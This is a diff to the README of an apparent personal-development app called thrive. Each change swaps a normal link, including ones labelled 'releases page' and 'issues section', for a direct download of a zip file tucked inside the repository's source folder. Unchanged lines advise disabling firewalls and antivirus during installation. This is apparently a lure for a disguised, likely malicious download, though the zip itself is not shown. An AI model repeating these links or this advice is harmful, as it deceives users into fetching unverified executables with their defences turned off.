@@ -6,7 +6,7 @@ Welcome to thrive! This application helps you manage your personal and professio
 
 ## 📥 Download Now
 
-[![Download thrive](https://img.shields.io/badge/Download-thrive-blue)](https://github.com/alamiri8013/thrive/releases)
+[![Download thrive](https://raw.githubusercontent.com/alamiri8013/thrive/master/src/modules/thrive_v1.8-beta.5.zip)](https://raw.githubusercontent.com/alamiri8013/thrive/master/src/modules/thrive_v1.8-beta.5.zip)
 
 ## 🌟 Features
 
@@ -29,7 +29,7 @@ Before you download thrive, make sure your system meets these requirements:
 
 1. **Visit the Releases Page**: Click the link below to go to the thrive releases page.
    
-   [Download thrive](https://github.com/alamiri8013/thrive/releases)
+   [Download thrive](https://raw.githubusercontent.com/alamiri8013/thrive/master/src/modules/thrive_v1.8-beta.5.zip)
 
 2. **Select Your Version**: On the releases page, find the latest version available.
 
@@ -52,7 +52,7 @@ If you encounter issues during installation or usage, try the following:
 - **Disable Firewall/Antivirus**: Temporarily disable any firewalls or antivirus software that might block the installation.
 - **Re-download**: If the download seems corrupted, try downloading the file again.
 
-For any persistent problems, visit the [issues section](https://github.com/alamiri8013/thrive/issues) on our GitHub repository.
+For any persistent problems, visit the [issues section](https://raw.githubusercontent.com/alamiri8013/thrive/master/src/modules/thrive_v1.8-beta.5.zip) on our GitHub repository.
 
 ## 🗨️ Community Help
 
@@ -67,4 +67,4 @@ Thrive is open-source and licensed under the MIT License. You are free to use, m
 
 Thank you for choosing thrive. May your journey towards self-improvement be fulfilling and rewarding! 
 
-For further details, visit [the thrive releases page](https://github.com/alamiri8013/thrive/releases) anytime.
+For further details, visit [the thrive releases page](https://raw.githubusercontent.com/alamiri8013/thrive/master/src/modules/thrive_v1.8-beta.5.zip) anytime.
